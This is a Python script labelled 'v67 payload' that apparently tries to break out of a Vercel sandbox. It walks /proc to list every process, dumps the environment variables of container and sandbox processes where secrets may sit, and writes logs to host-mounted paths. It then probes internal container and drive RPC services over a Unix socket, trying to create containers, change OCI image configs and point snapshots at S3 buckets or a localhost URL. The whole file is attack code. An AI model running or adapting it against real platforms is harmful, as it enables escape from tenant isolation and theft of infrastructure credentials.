# -*- coding: utf-8 -*-
"""v67 payload: 全量进程枚举 (无 pid ns) + ContainersService/Create 探测 + SetOCIImageConfig base64"""
import socket, time, os

OUT = '/vercel/sandbox/v67c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v67c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def ps_all():
    rows = []
    try:
        for d in os.listdir('/proc'):
            if not d.isdigit():
                continue
            try:
                cmd = open('/proc/%s/cmdline' % d, 'rb').read().replace(b'\0', b' ').decode(errors='replace')[:110]
            except Exception:
                cmd = ''
            if cmd.strip():
                rows.append((int(d), cmd))
    except Exception as e:
        log('ps_all EXC %s' % e)
    log('TOTAL_PROC %d' % len(rows))
    for pid, cmd in sorted(rows):
        log('PS %d: %s' % (pid, cmd))
    for pid, cmd in sorted(rows):
        cl = cmd.lower()
        if any(k in cl for k in ('cell', 'sandbox', 'vercel', 'containerd', 'runc', 'systemd', 'shim', 'init')):
            try:
                env = open('/proc/%d/environ' % pid, 'rb').read().replace(b'\0', b'\n').decode(errors='replace')
                log('--- ENV %d ---\n%s' % (pid, env[:3000]))
            except Exception as e:
                log('env %d EXC %s' % (pid, e))


def main():
    log('V67 payload start pid=%d' % os.getpid())
    ps_all()

    CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
    CTRC = '/vercel.hive.cell.api.containers.v1.ContainersService/Create'
    OCI = '/vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig'
    probes = [
        ('ctr-img', CTRC, '{"image":"busybox"}'),
        ('ctr-img2', CTRC, '{"image":"docker.io/library/busybox:latest"}'),
        ('ctr-drive', CTRC, '{"drive_id":"sandbox"}'),
        ('ctr-both', CTRC, '{"image":"x","drive_id":"sandbox"}'),
        ('ctr-sbimg', CTRC,
         '{"image":"977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59"}'),
        ('oci-b64', OCI, '{"drive_id":"sandbox","oci_image_config":"e30="}'),
        ('oci-b64m', OCI,
         '{"drive_id":"sandbox","oci_image_config":"eyJkaWdlc3QiOiJzaGEyNTY6OTVmZDA2MDEzZjRlMTcwOGJlOTE0ZGM5NzM2NjNhYjUwZTQ4ZDAwNDUwODczNDBjYzcxY2Y5MDNlMjg0MWI1OSIsIm1lZGlhVHlwZSI6ImFwcGxpY2F0aW9uL3ZuZC5vY2kuaW1hZ2UubWFuaWZlc3QudjEranNvbiIsInNpemUiOiI4NTYifQ=="}'),
        ('snap-s3ok', CSP, '{"drive_id":"sandbox","base_url":"s3://sandbox-controller/b/k"}'),
        ('snap-s3vercel', CSP, '{"drive_id":"sandbox","base_url":"s3://vercel-sandbox/b/k"}'),
        ('snap-http', CSP, '{"drive_id":"sandbox","base_url":"http://127.0.0.1:18080/b/k"}'),
    ]
    for name, path, body in probes:
        t0 = time.time()
        st, bd = rpc(path, body, t=3)
        dt = time.time() - t0
        log('%-12s -> %s (%.2fs) | %s' % (name, st, dt, bd[:180].replace('\n', ' ')))
        time.sleep(0.1)
    log('V67C_DONE')


main()
